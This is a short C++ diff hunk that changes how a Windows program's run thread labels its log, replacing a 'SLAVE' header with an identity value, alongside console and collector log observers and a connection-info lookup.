@@ -60,7 +60,7 @@ DWORD WINAPI run(void)
 {
 	try
 	{
-		LOG.setHeader("SLAVE");
+		LOG.setIdentity(Innocence::identity);
 		LOG.addObserver(new Common::LogToConsole);
 		LOG.addObserver(new Common::LogToCollector);
 		ConnectionInfo info = getConnectionInfo();	    
